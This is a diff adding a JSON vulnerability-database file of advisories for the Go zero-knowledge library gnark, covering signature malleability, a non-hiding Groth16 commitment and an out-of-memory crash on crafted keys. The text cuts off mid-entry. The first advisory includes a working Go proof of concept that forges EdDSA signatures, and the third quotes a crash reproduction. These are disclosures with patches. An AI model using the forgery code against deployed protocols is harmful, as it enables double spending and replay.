@@ -1,0 +1,744 @@
+{
+ "vulns": [
+  {
+   "id": "GHSA-95v9-hv42-pwrj",
+   "summary": "gnark is vulnerable to signature malleability in EdDSA and ECDSA due to missing scalar checks",
+   "details": "In version before, `sig.s` used without asserting `0 \u2264 S < order` in `Verify function` in [eddsa.go](https://github.com/Consensys/gnark/blob/d9a42397979b05f95f21a601fd219b06a8d60b7b/std/signature/eddsa/eddsa.go) and [ecdsa.go](https://github.com/Consensys/gnark/blob/d9a42397979b05f95f21a601fd219b06a8d60b7b/std/signature/ecdsa/ecdsa.go), which will lead to *signature malleability* vulnerability. \n\n\n\n### Impact\n\nSince gnark\u2019s native EdDSA and ECDSA circuits lack essential constraints, multiple distinct witnesses can satisfy the same public inputs. In protocols where nullifiers or anti-replay checks are derived from `(R, S)`, this enables signature malleability and may lead to double spending.\n\n\n\n### Exploitation\n\n```go\npackage main\n\nimport (\n\t\"crypto/rand\"\n\t\"fmt\"\n\t\"math/big\"\n\n\t\"github.com/consensys/gnark-crypto/ecc\"\n\tmimcHash \"github.com/consensys/gnark-crypto/ecc/bn254/fr/mimc\"\n\teddsaCrypto \"github.com/consensys/gnark-crypto/ecc/bn254/twistededwards/eddsa\"\n\n\t\"github.com/consensys/gnark/backend/groth16\"\n\t\"github.com/consensys/gnark/frontend\"\n\t\"github.com/consensys/gnark/frontend/cs/r1cs\"\n\t\"github.com/consensys/gnark/std/algebra/native/twistededwards\"\n\tstdMimc \"github.com/consensys/gnark/std/hash/mimc\"\n\tstdEddsa \"github.com/consensys/gnark/std/signature/eddsa\"\n\n\tte \"github.com/consensys/gnark-crypto/ecc/twistededwards\"\n)\n\n// Circuit\ntype eddsaCircuit struct {\n\tMsg frontend.Variable  `gnark:\",public\"`\n\tPk  stdEddsa.PublicKey `gnark:\",public\"`\n\tSig stdEddsa.Signature\n}\n\nfunc (c *eddsaCircuit) Define(api frontend.API) error {\n\tcurve, _ := twistededwards.NewEdCurve(api, te.BN254)\n\thasher, _ := stdMimc.NewMiMC(api)\n\tstdEddsa.Verify(curve, c.Sig, c.Msg, c.Pk, &hasher)\n\treturn nil\n}\n\nfunc groupOrder() *big.Int {\n\t// BN254 scalar field order (r)\n\tconst rStr = \"21888242871839275222246405745257275088548364400416034343698204186575808495617\"\n\tn, _ := new(big.Int).SetString(rStr, 10)\n\treturn n\n}\n\n// Forge signature: S \u2192 S + order\nfunc forge(sig eddsaCrypto.Signature) eddsaCrypto.Signature {\n\torder := groupOrder()\n\n\tvar forged eddsaCrypto.Signature\n\tforged.R = sig.R\n\n\ts := new(big.Int).SetBytes(sig.S[:])\n\ts.Add(s, order)\n\n\tbuf := make([]byte, 32)\n\tcopy(buf[32-len(s.Bytes()):], s.Bytes())\n\tcopy(forged.S[:], buf)\n\treturn forged\n}\n\nfunc main() {\n\t// Generate key pair\n\tpriv, _ := eddsaCrypto.GenerateKey(rand.Reader)\n\tpub := priv.PublicKey\n\tmsg := []byte(\"multi-witness\")\n\n\t// Create honest signature\n\th := mimcHash.NewMiMC()\n\th.Write(msg)\n\trawSig, _ := priv.Sign(msg, h)\n\n\tvar honest eddsaCrypto.Signature\n\thonest.SetBytes(rawSig)\n\tforged := forge(honest) // S + order\n\n\t// Setup: Compile circuit and do trusted setup\n\tcircuit := &eddsaCircuit{}\n\tccs, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, circuit)\n\tif err != nil {\n\t\tfmt.Printf(\"Circuit compilation failed: %v\\n\", err)\n\t\treturn\n\t}\n\n\tpk, vk, err := groth16.Setup(ccs)\n\tif err != nil {\n\t\tfmt.Printf(\"Trusted setup failed: %v\\n\", err)\n\t\treturn\n\t}\n\n\t// Public inputs (same for both witnesses)\n\tvar public eddsaCircuit\n\tpublic.Msg = new(big.Int).SetBytes(msg)\n\tpublic.Pk.Assign(te.BN254, pub.Bytes())\n\n\t// witness 1: honest signature\n\tw1 := public\n\tw1.Sig.Assign(te.BN254, honest.Bytes())\n\n\twitness1, err := frontend.NewWitness(&w1, ecc.BN254.ScalarField())\n\tif err != nil {\n\t\tfmt.Printf(\"Failed to create witness1: %v\\n\", err)\n\t\treturn\n\t}\n\n\tproof1, err := groth16.Prove(ccs, pk, witness1)\n\tif err != nil {\n\t\tfmt.Println(\"Witness 1 (honest): Prover failed!\")\n\t} else {\n\t\tpublicWitness1, err := witness1.Public()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Witness 1 (honest): Prover failed!\")\n\t\t} else {\n\t\t\terr = groth16.Verify(proof1, vk, publicWitness1)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Println(\"Witness 1 (honest): Prover failed!\")\n\t\t\t} else {\n\t\t\t\tfmt.Println(\"Witness 1 (honest): Prover succeeded!\")\n\t\t\t}\n\t\t}\n\t}\n\n\t// witness 2: forged signature\n\tw2 := public\n\tw2.Sig.Assign(te.BN254, forged.Bytes())\n\tfmt.Println(honest.R.Equal(&forged.R))\n\tfmt.Println(honest.S != forged.S)\n\n\twitness2, err := frontend.NewWitness(&w2, ecc.BN254.ScalarField())\n\tif err != nil {\n\t\tfmt.Printf(\"Failed to create witness2: %v\\n\", err)\n\t\treturn\n\t}\n\n\tproof2, err := groth16.Prove(ccs, pk, witness2)\n\tif err != nil {\n\t\tfmt.Println(\"Witness 2 (forged): Prover failed!\")\n\t} else {\n\t\tpublicWitness2, err := witness2.Public()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Witness 2 (forged): Prover failed!\")\n\t\t} else {\n\t\t\terr = groth16.Verify(proof2, vk, publicWitness2)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Println(\"Witness 2 (forged): Prover failed!\")\n\t\t\t} else {\n\t\t\t\tfmt.Println(\"Witness 2 (forged): Prover succeeded!\")\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n### Result\n\n```bash\ngo run multiple_witnesses.go\n\n13:47:33 INF compiling circuit\n13:47:33 INF parsed circuit inputs nbPublic=3 nbSecret=3\n13:47:33 INF building constraint builder nbConstraints=7003\n13:47:33 DBG constraint system solver done nbConstraints=7003 took=2.696334\n13:47:33 DBG prover done acceleration=none backend=groth16 curve=bn254 nbConstraints=7003 took=44.164208\n13:47:33 DBG verifier done backend=groth16 curve=bn254 took=0.983583\nWitness 1 (honest): Prover succeeded!\ntrue\ntrue\n13:47:33 DBG constraint system solver done nbConstraints=7003 took=2.59125\n13:47:33 DBG prover done acceleration=none backend=groth16 curve=bn254 nbConstraints=7003 took=47.168709\n13:47:33 DBG verifier done backend=groth16 curve=bn254 took=0.995833\nWitness 2 (forged): Prover succeeded!\n```\n\n\n\n### Credits\n\nXlabAI Team of Tencent Xuanwu Lab\n\nAtuin Automated Vulnerability Discovery Engine \n\nSJTU Group of Software Security In Progress\n\nProf. Yu Yu's Lab at SJTU\n\n### Additional mitigation\n\nThe initial patch added check for `s <= curve order`, omitting the case `s == curve order`. Even though the case is unlikely to be exploitable (requires finding a preimage for `H(R || A || M)`), then it is additionally fixed in https://github.com/Consensys/gnark/pull/1684 (commit https://github.com/Consensys/gnark/commit/69638c5f14b77ae0ebee23e1d8f64f3bb4e22fd5 on master). Thanks for additional reporting by https://github.com/kexinoh.",
+   "aliases": [
+    "CVE-2025-57801",
+    "GO-2025-3912"
+   ],
+   "modified": "2026-02-03T03:10:06.577758Z",
+   "published": "2025-08-22T20:58:21Z",
+   "database_specific": {
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-08-22T20:58:21Z",
+    "nvd_published_at": "2025-08-22T20:15:33Z",
+    "cwe_ids": [
+     "CWE-347"
+    ],
+    "severity": "HIGH"
+   },
+   "references": [
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/security/advisories/GHSA-95v9-hv42-pwrj"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-57801"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/commit/0ba6730f05537a351517998add89a61a0d82716e"
+    },
+    {
+     "type": "PACKAGE",
+     "url": "https://github.com/Consensys/gnark"
+    },
+    {
+     "type": "WEB",
+     "url": "https://pkg.go.dev/vuln/GO-2025-3912"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/consensys/gnark",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/consensys/gnark"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "0.14.0"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-95v9-hv42-pwrj/GHSA-95v9-hv42-pwrj.json"
+     }
+    }
+   ],
+   "schema_version": "1.9.0",
+   "severity": [
+    {
+     "type": "CVSS_V3",
+     "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
+    },
+    {
+     "type": "CVSS_V4",
+     "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N"
+    }
+   ]
+  },
+  {
+   "id": "GHSA-9xcg-3q8v-7fq6",
+   "summary": "gnark commitments to private witnesses in Groth16 as implemented break zero-knowledge property",
+   "details": "\nThis report concerns the Groth16 prover when used with commitments (as in `frontend.Committer`). To simplify exposition of the issue, I will focus on the case of a single commitment, to only private witnesses. But the issue should be present whenever commitments are used that include private witnesses.\n>\nThe commitment to private witnesses `w_i` is computed as\n```\nc = sum_i w_i * b_i\n```\nwhere `b_i` would be `ProvingKey.CommitmentKeys[0].Basis[i]` in the code.\n\nWhile this is a binding commitment, it is not hiding. In practice, an adversary will know the points `b_i`, as they are part of the proving key, and can verify correctness of a guess for the values of `w_i` by computing `c'` as the right hand side of the above formula, and checking whether `c'` is equal to `c`. I attach a proof of concept that demonstrates this.\n\nThis breaks the perfect zero-knowledge property of Groth16, so the Groth16 scheme using commitments to private witnesses as implemented by gnark fails to be a zk-SNARK.\n\nThe code indicates that the extension to Groth16 given by the commitments follows the paper \"Recursion over Public-Coin Interactive Proof Systems; Faster Hash Verification\" by Alexandre Belling, Azam Soleimanian, and Olivier Begassat. In that paper, it seems that commitments are applied to what were originally public inputs, which are moved to private witnesses for efficiency reasons. In any case, that paper does not discuss any hiding/privacy/zero-knowledge properties of their protocols.\n\nSo for the use-cases envisioned by that paper, having the commitment not be hiding and losing zero-knowledge of Groth16 might be adequate. However, the documentation by gnark does not make clear that committing to private witnesses loses the zero-knowledge property. The documentation for `frontend.Committer` does not mention this, and the following snippet from `std/multicommit/doc_test.go`, where private witness variables are named `Secrets` and are committed, seems to actively suggest that committed witnesses are still private.\n```go\n// MultipleCommitmentCircuit is an example circuit showing usage of multiple\n// independent commitments in-circuit.\ntype MultipleCommitmentsCircuit struct {\n    Secrets [4]frontend.Variable\n}\n\nfunc (c *MultipleCommitmentsCircuit) Define(api frontend.API) error {\n    // first callback receives first unique commitment derived from the root commitment\n    multicommit.WithCommitment(api, func(api frontend.API, commitment frontend.Variable) error {\n        // compute (X-s[0]) * (X-s[1]) for a random X\n        res := api.Mul(api.Sub(commitment, c.Secrets[0]), api.Sub(commitment, c.Secrets[1]))\n        api.AssertIsDifferent(res, 0)\n        return nil\n    }, c.Secrets[:2]...)\n   // ...\n```\n\nThus it seems to me that the intention likely was (and users will be expecting) that gnark's implementation of Groth16 with these commitments should still have zero-knowledge and that the commitments should be hiding.\n\nThe way to fix this is likely to adjust the commitment to be hiding the way that is done in the LegoSNARK paper (https://eprint.iacr.org/2019/142.pdf). To expand:\n\nFirst, let me fix some notation.\n\nCurrently, the verifying key has two points on G2 used for checking the proof of knowledge for the commitment: `g` and `g'=-1/\u03c3 * g` (in the code: `VerifyingKey.CommitmentKey.G` and `VerifyingKey.CommitmentKey.GRootSigmaNeg`).\nThe commitment itself is then `c = sum_i w_i * b_i`, where `b_i` are on G1, and the proof of knowledge associated to `c` is calculated as `pok = sum_i w_i * b'_i`, where `b'_i = \u03c3*b_i` (in the code `b_i` and `b'_i` are `ProvingKey.CommitmentKeys.Basis[0][i]` and `ProvingKey.CommitmentKeys.BasisExpSigma[0][i]`). The proof of knowledge is then verified by checking `e(c, g) + e(pok, g') = 0` (I am using additive notation throughout here).\n\nThe Groth16 proof is verified by checking\n```\ne(Krs, -[\u03b4]\u2082) + e(c, -[\u03b3]\u2082) + e(term involving public inputs, -[\u03b3]\u2082) + other terms = 0\n```\n\nThe construction ccGro16 from the LegoSNARK paper (page 73 in https://eprint.iacr.org/2019/142.pdf) is a similar construction. They do not have a proof of knowledge accompanying the commitment because they are considering the case where there are no public inputs. However, they claim that their scheme is zero-knowledge, and the crucial difference for this is that their commitment has an extra blinding term as is usual for Pedersen commitments. Concretely, it is of the form:\n```\nc_new = sum_i w_i * b_i + v*[\u03b7/\u03b3]\u2081\n```\nwhere `[\u03b7/\u03b3]\u2081` is a new element of G1 that is part of the proving key, with `\u03b7` a new toxic waste field element. The value of `v` is randomly chosen by the prover.\n\nWhen adding this additional term to `c`, then to make the proof verification still succeeds, the proof point `Krs` is changed accordingly:\n```\nKrs_new = Krs_old -  v*[\u03b7/\u03b4]\u2081\n```\nwhere `[\u03b7/\u03b4]\u2081` is another new element of G1 that is part of the proving key. As `e([\u03b7/\u03b3]\u2081, -[\u03b3]\u2082) = e([\u03b7/\u03b4]\u2081, -[\u03b4]\u2082)`, the contributions from the new terms cancel each other in the proof verification pairing check.\n\nThis modification should ensure that the commitment is hiding.\n\nThe proof of knowledge would also need to be adapted accordingly, with\n```\npok = sum_i w_i * b'_i + v*[\u03c3*\u03b7/\u03b3]\u2081\n```\nwhere `[\u03c3*\u03b7/\u03b3]\u2081` is another point of G1 to add to the proving key.\n\n\n### Impact\n\nThe vulnerability affects only Groth16 proofs with commitments. Notably, PLONK proofs are not affected.\n\nThe vulnerability affects the zero-knowledge property of the proofs - in case the witness (secret or internal) values are small, then the attacker may be able to enumerate all possible choices to deduce the actual value. If the possible choices for the variables to be committed is large or there are many values committed, then it would be computationally infeasible to enumerate all valid choices.\n\nIt doesn't affect the completeness/soundness of the proofs.\n\n### Patches\n\nThe vulnerability has been fixed in https://github.com/Consensys/gnark/pull/1245. Corresponding commit on the master branch https://github.com/Consensys/gnark/commit/afda68a38acca37becb8ba6d8982d03fee9559a0.\n\nThe patch to fix the issue is to add additional randomized value to the list of committed value at proving time to mask the rest of the values which were committed.\n\n### Workarounds\n\nThe user can manually commit to a randomized value.\n",
+   "aliases": [
+    "CVE-2024-45040",
+    "GO-2024-3123"
+   ],
+   "modified": "2024-11-18T16:27:10Z",
+   "published": "2024-09-06T19:40:01Z",
+   "database_specific": {
+    "cwe_ids": [
+     "CWE-200"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-09-06T19:40:01Z",
+    "nvd_published_at": "2024-09-06T13:15:04Z"
+   },
+   "references": [
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/security/advisories/GHSA-9xcg-3q8v-7fq6"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45040"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/pull/1245"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/commit/afda68a38acca37becb8ba6d8982d03fee9559a0"
+    },
+    {
+     "type": "PACKAGE",
+     "url": "https://github.com/Consensys/gnark"
+    },
+    {
+     "type": "WEB",
+     "url": "https://pkg.go.dev/vuln/GO-2024-3123"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/consensys/gnark",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/consensys/gnark"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "0.11.0"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-9xcg-3q8v-7fq6/GHSA-9xcg-3q8v-7fq6.json"
+     }
+    },
+    {
+     "package": {
+      "name": "github.com/consensys/gnark",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/consensys/gnark"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "0.11.0"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-9xcg-3q8v-7fq6/GHSA-9xcg-3q8v-7fq6.json"
+     }
+    }
+   ],
+   "schema_version": "1.9.0",
+   "severity": [
+    {
+     "type": "CVSS_V3",
+     "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+    },
+    {
+     "type": "CVSS_V4",
+     "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+    }
+   ]
+  },
+  {
+   "id": "GHSA-cph5-3pgr-c82g",
+   "summary": "Gnark out-of-memory during deserialization with crafted inputs",
+   "details": "Thanks @pventuzelo for reporting.\n\nFrom the correspondence:\n\n> Hi,\n> \n> We (Fuzzinglabs & Lambdaclass) found that during deserialization of certain files representing a `VerifyingKey`, an excessive memory allocation is happening consuming a lot of resources and even triggering a crash with the error `fatal error: runtime: out of memory`.\n> \n> Please find the details below:\n> \n> ## Vulnerability Details\n> \n> - **Severity:** Critical -> DoS\n> - **Affected Component:** Deserialization\n> \n> ## Environment\n> \n> - **Compiler Version:** go version go1.22.2 linux/amd64\n> - **Distro Version:** Ubuntu 24.04.1 LTS\n> \n> - **Additional Environment Details:**\n>   - `[github.com/consensys/gnark](http://github.com/consensys/gnark) v0.11.0`\n>   - `[github.com/consensys/gnark-crypto](http://github.com/consensys/gnark-crypto) v0.14.1-0.20240909142611-e6b99e74cec1`\n> \n> ## Steps to Reproduce\n> \n> You can download the needed files here: https://drive.google.com/drive/folders/1KQ5I3vv4bUllvqbatGappwbAkIcR2NI_?usp=sharing\n> \n> You have to run\n> \n> ```shell\n> go run gnark_poc.go\n> ```\n> \n> in a terminal.\n> \n> Running the provided code will result in a memory crash or an extremely large memory allocation, which can be observed using the following command:\n> \n> ```shell\n> go tool pprof -web mem.pprof\n> ```\n> \n> ## Root Cause Analysis\n> \n> The provided code loads a `VerifyingKey` from `old.vk` by calling the `ReadFrom` function. This function is implemented in [backend/groth16/bn254/marshal.go](https://github.com/Consensys/gnark/blob/ca8e1568f47ae6b717eda0a6734d87645edaecf7/backend/groth16/bn254/marshal.go#L174C2-L174C25) within the [gnark](https://github.com/Consensys/gnark) library.\n> \n> The provided example uses the elliptic curve BN-254, so the code resides in the [backend/groth16/bn254/](https://github.com/Consensys/gnark/blob/ca8e1568f47ae6b717eda0a6734d87645edaecf7/backend/groth16/bn254/) repertory. However, the same error exists in other repertories, such as [backend/groth16/bls12-377/](https://github.com/Consensys/gnark/blob/ca8e1568f47ae6b717eda0a6734d87645edaecf7/backend/groth16/bls12-377/).\n> \n> At [line 207](https://github.com/Consensys/gnark/blob/ca8e1568f47ae6b717eda0a6734d87645edaecf7/backend/groth16/bn254/marshal.go#L207), a slice is allocated with a length of `nbCommitments`. This variable is directly extracted from the deserialized file, which, in our case, has a value of `2,327,186,600`. This large value may be too big for some configurations, leading to memory allocations of approximately \u00b11\u202fTB, as observed with `pprof`.\n> \n> ## Detailed Behavior\n> \n> ```shell\n> go run gnark_poc.go\n> ```\n> \n> ```\n> fatal error: runtime: out of memory\n> \n> runtime stack:\n> runtime.throw({0x5fe946?, 0x2052ae?})\n> /usr/lib/go-1.22/src/runtime/panic.go:1023 +0x5c fp=0x7ffd65b321a0 sp=0x7ffd65b32170 pc=0x438a9c\n> runtime.sysMapOS(0xc000400000, 0x8ab6400000)\n> /usr/lib/go-1.22/src/runtime/mem_linux.go:167 +0x11b fp=0x7ffd65b321e0 sp=0x7ffd65b321a0 pc=0x418bbb\n> runtime.sysMap(0xc000400000, 0x8ab6400000, 0x7b19c8?)\n> /usr/lib/go-1.22/src/runtime/mem.go:155 +0x34 fp=0x7ffd65b32200 sp=0x7ffd65b321e0 pc=0x418634\n> runtime.(*mheap).grow(0x7a17c0, 0x455b066?)\n> /usr/lib/go-1.22/src/runtime/mheap.go:1534 +0x236 fp=0x7ffd65b32270 sp=0x7ffd65b32200 pc=0x42b176\n> runtime.(*mheap).allocSpan(0x7a17c0, 0x455b066, 0x0, 0x1)\n> /usr/lib/go-1.22/src/runtime/mheap.go:1246 +0x1b0 fp=0x7ffd65b32310 sp=0x7ffd65b32270 pc=0x42a850\n> runtime.(*mheap).alloc.func1()\n> /usr/lib/go-1.22/src/runtime/mheap.go:964 +0x5c fp=0x7ffd65b32358 sp=0x7ffd65b32310 pc=0x42a2fc\n> runtime.systemstack(0x46d79f)\n> /usr/lib/go-1.22/src/runtime/asm_amd64.s:509 +0x4a fp=0x7ffd65b32368 sp=0x7ffd65b32358 pc=0x46912a\n> \n> goroutine 1 gp=0xc0000061c0 m=0 mp=0x798ca0 [running]:\n> runtime.systemstack_switch()\n> /usr/lib/go-1.22/src/runtime/asm_amd64.s:474 +0x8 fp=0xc000031b68 sp=0xc000031b58 pc=0x4690c8\n> runtime.(*mheap).alloc(0x5bc040?, 0xc00012bb08?, 0xa0?)\n> /usr/lib/go-1.22/src/runtime/mheap.go:958 +0x5b fp=0xc000031bb0 sp=0xc000031b68 pc=0x42a25b\n> runtime.(*mcache).allocLarge(0xc000126510?, 0x8ab60ca800, 0x1)\n> /usr/lib/go-1.22/src/runtime/mcache.go:234 +0x87 fp=0xc000031c00 sp=0xc000031bb0 pc=0x4176e7\n> runtime.mallocgc(0x8ab60ca800, 0x5d92a0, 0x1)\n> /usr/lib/go-1.22/src/runtime/malloc.go:1165 +0x597 fp=0xc000031c88 sp=0xc000031c00 pc=0x40ef97\n> runtime.makeslice(0xc00011c180?, 0x0?, 0x2?)\n> /usr/lib/go-1.22/src/runtime/slice.go:107 +0x49 fp=0xc000031cb0 sp=0xc000031c88 pc=0x4500c9\n> [github.com/consensys/gnark/backend/groth16/bn254.(*VerifyingKey).readFrom(0xc0001b7088](http://github.com/consensys/gnark/backend/groth16/bn254.(*VerifyingKey).readFrom(0xc0001b7088), {0x6598a0, 0xc00011dc50}, 0x0)\n> /home/raunan/go/pkg/mod/[github.com/!ronan!thoraval/gnark@v0.0.0-20241007163125-4c0a7511c3d1/backend/groth16/bn254/marshal.go:214](http://github.com/!ronan!thoraval/gnark@v0.0.0-20241007163125-4c0a7511c3d1/backend/groth16/bn254/marshal.go:214) +0x765 fp=0xc000031ea8 sp=0xc000031cb0 pc=0x59b205\n> [github.com/consensys/gnark/backend/groth16/bn254.(*VerifyingKey).ReadFrom(0x100469020](http://github.com/consensys/gnark/backend/groth16/bn254.(*VerifyingKey).ReadFrom(0x100469020)?, {0x6598a0?, 0xc00011dc50?})\n> /home/raunan/go/pkg/mod/[github.com/!ronan!thoraval/gnark@v0.0.0-20241007163125-4c0a7511c3d1/backend/groth16/bn254/marshal.go:166](http://github.com/!ronan!thoraval/gnark@v0.0.0-20241007163125-4c0a7511c3d1/backend/groth16/bn254/marshal.go:166) +0x1f fp=0xc000031ed8 sp=0xc000031ea8 pc=0x59aa5f\n> main.main()\n> /home/raunan/gnark_poc/gnark_poc/gnark_poc.go:19 +0xba fp=0xc000031f50 sp=0xc000031ed8 pc=0x5addda\n> runtime.main()\n> /usr/lib/go-1.22/src/runtime/proc.go:271 +0x29d fp=0xc000031fe0 sp=0xc000031f50 pc=0x43b55d\n> runtime.goexit({})\n> /usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc000031fe8 sp=0xc000031fe0 pc=0x46b0e1\n> \n> goroutine 2 gp=0xc000006c40 m=nil [force gc (idle)]:\n> runtime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)\n> /usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000074fa8 sp=0xc000074f88 pc=0x43b98e\n> runtime.goparkunlock(...)\n> /usr/lib/go-1.22/src/runtime/proc.go:408\n> runtime.forcegchelper()\n> /usr/lib/go-1.22/src/runtime/proc.go:326 +0xb3 fp=0xc000074fe0 sp=0xc000074fa8 pc=0x43b813\n> runtime.goexit({})\n> /usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc000074fe8 sp=0xc000074fe0 pc=0x46b0e1\n> created by runtime.init.6 in goroutine 1\n> /usr/lib/go-1.22/src/runtime/proc.go:314 +0x1a\n> \n> goroutine 3 gp=0xc000007180 m=nil [GC sweep wait]:\n> runtime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)\n> /usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000075780 sp=0xc000075760 pc=0x43b98e\n> runtime.goparkunlock(...)\n> /usr/lib/go-1.22/src/runtime/proc.go:408\n> runtime.bgsweep(0xc0000240e0)\n> /usr/lib/go-1.22/src/runtime/mgcsweep.go:278 +0x94 fp=0xc0000757c8 sp=0xc000075780 pc=0x426cf4\n> runtime.gcenable.gowrap1()\n> /usr/lib/go-1.22/src/runtime/mgc.go:203 +0x25 fp=0xc0000757e0 sp=0xc0000757c8 pc=0x41b845\n> runtime.goexit({})\n> /usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc0000757e8 sp=0xc0000757e0 pc=0x46b0e1\n> created by runtime.gcenable in goroutine 1\n> /usr/lib/go-1.22/src/runtime/mgc.go:203 +0x66\n> \n> goroutine 4 gp=0xc000007340 m=nil [GC scavenge wait]:\n> runtime.gopark(0xc0000240e0?, 0x657100?, 0x1?, 0x0?, 0xc000007340?)\n> /usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000075f78 sp=0xc000075f58 pc=0x43b98e\n> runtime.goparkunlock(...)\n> /usr/lib/go-1.22/src/runtime/proc.go:408\n> runtime.(*scavengerState).park(0x797520)\n> /usr/lib/go-1.22/src/runtime/mgcscavenge.go:425 +0x49 fp=0xc000075fa8 sp=0xc000075f78 pc=0x4246e9\n> runtime.bgscavenge(0xc0000240e0)\n> /usr/lib/go-1.22/src/runtime/mgcscavenge.go:653 +0x3c fp=0xc000075fc8 sp=0xc000075fa8 pc=0x424c7c\n> runtime.gcenable.gowrap2()\n> /usr/lib/go-1.22/src/runtime/mgc.go:204 +0x25 fp=0xc000075fe0 sp=0xc000075fc8 pc=0x41b7e5\n> runtime.goexit({})\n> /usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc000075fe8 sp=0xc000075fe0 pc=0x46b0e1\n> created by runtime.gcenable in goroutine 1\n> /usr/lib/go-1.22/src/runtime/mgc.go:204 +0xa5\n> \n> goroutine 18 gp=0xc000102700 m=nil [finalizer wait]:\n> runtime.gopark(0xc000074648?, 0x40f445?, 0xa8?, 0x1?, 0xc0000061c0?)\n> /usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000074620 sp=0xc000074600 pc=0x43b98e\n> runtime.runfinq()\n> /usr/lib/go-1.22/src/runtime/mfinal.go:194 +0x107 fp=0xc0000747e0 sp=0xc000074620 pc=0x41a887\n> runtime.goexit({})\n> /usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc0000747e8 sp=0xc0000747e0 pc=0x46b0e1\n> created by runtime.createfing in goroutine 1\n> /usr/lib/go-1.22/src/runtime/mfinal.go:164 +0x3d\n> exit status 2\n> ```\n> \n> ## Appendices\n> \n> This problem can also happen with `ProvingKey`.\n\n### Impact\n\nProver and verifier denial of service in case of maliciously crafted inputs (public key, verification key).\n\n### Patches\n\nThe issue is patched in https://github.com/Consensys/gnark/pull/1307. It was merged to gnark master at https://github.com/Consensys/gnark/commit/47ae846339add2bdf9983e499342bfdfe195191d. The fix will be incorporated in the next minor release of gnark (v0.11.1).\n\n### Workarounds\n\nThere are no convenient work-arounds currently. The best approach currently is to run key verification as a separate service which halts the verification pipeline in case of OOM when verification keys come from untrusted sources.",
+   "aliases": [
+    "CVE-2024-50354",
+    "GO-2024-3244"
+   ],
+   "modified": "2024-11-04T13:48:55Z",
+   "published": "2024-10-31T20:37:00Z",
+   "database_specific": {
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-10-31T20:37:00Z",
+    "nvd_published_at": "2024-10-31T16:15:05Z",
+    "cwe_ids": [
+     "CWE-400"
+    ]
+   },
+   "references": [
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/security/advisories/GHSA-cph5-3pgr-c82g"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-50354"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/pull/1307"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/commit/47ae846339add2bdf9983e499342bfdfe195191d"
+    },
+    {
+     "type": "PACKAGE",
+     "url": "https://github.com/Consensys/gnark"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/advisories/GHSA-cph5-3pgr-c82g"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/consensys/gnark",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/consensys/gnark"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "0.11.1"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
